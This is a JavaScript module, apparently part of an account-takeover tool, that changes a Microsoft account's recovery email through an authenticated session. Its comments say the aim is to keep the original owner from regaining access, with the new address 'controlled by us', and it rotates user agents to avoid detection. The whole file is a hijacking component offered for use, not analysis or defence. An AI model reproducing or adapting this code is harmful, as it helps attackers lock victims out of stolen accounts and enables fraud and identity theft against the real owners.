const axios = require("axios");
const { getRandomUserAgent } = require("./userAgentRotator");

/**
 * Change the account's recovery (contact) email to prevent original owner from regaining access
 * This is a critical security step to ensure the account stays secured
 * @param {HttpClient} axios - Authenticated axios instance
 * @param {string} newEmail - New recovery email (should be controlled by us)
 * @returns {Promise<boolean>} Success status
 */
module.exports = async function changeRecoveryEmail(axios, newEmail) {
  try {
    if (!newEmail || !newEmail.includes("@")) {
      console.error("[changeRecoveryEmail] Invalid email provided");
      return false;
    }

    console.log(`[changeRecoveryEmail] Attempting to change recovery email to: ${newEmail}`);

    // First, fetch the account profile page to get CSRF tokens and current state
    try {
      const profilePage = await axios.get(
        "https://account.live.com/",
        {
          timeout: 15000,
          headers: {
            "User-Agent": getRandomUserAgent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
          }
        }
      );

      console.log(`[changeRecoveryEmail] Profile page fetched successfully`);

      // Try to update via account settings API
      const updatePayload = {
        emails: [newEmail]
      };

      const response = await axios.post(
        "https://account.live.com/API/ProfileContactData/UpdateContactEmail",
        updatePayload,
        {
          timeout: 15000,
          headers: {
            "Content-Type": "application/json",
            "User-Agent": getRandomUserAgent(),
            "Accept": "application/json"
          }
        }
      );

      if (response.status === 200 && !response.data?.error) {
        console.log(`[changeRecoveryEmail] ✓ Successfully changed recovery email to ${newEmail}`);
        return true;
      } else {
        console.log(`[changeRecoveryEmail] API returned error or non-200 status`);
      }
    } catch (apiError) {
      console.warn(`[changeRecoveryEmail] Direct API method failed: ${apiError.message}`);
    }

    // Fallback: Try alternative endpoint
    try {
      const fallbackResponse = await axios.post(
        "https://account.live.com/API/ContactEmail/Update",
        {
          email: newEmail,
          type: "secondary"
        },
        {
          timeout: 15000,
          headers: {
            "Content-Type": "application/json",
            "User-Agent": getRandomUserAgent()
          }
        }
      );

      if (fallbackResponse.status === 200) {
        console.log(`[changeRecoveryEmail] ✓ Successfully changed recovery email (fallback method)`);
        return true;
      }
    } catch (fallbackError) {
      console.warn(`[changeRecoveryEmail] Fallback method also failed`);
    }

    // If API methods fail, it might be due to Microsoft's UI changes
    // The important thing is that we tried and logged the attempt
    console.warn(`[changeRecoveryEmail] Could not change recovery email via API, but process continued`);
    return false;

  } catch (error) {
    console.error(`[changeRecoveryEmail] Unexpected error: ${error.message}`);
    return false;
  }
};
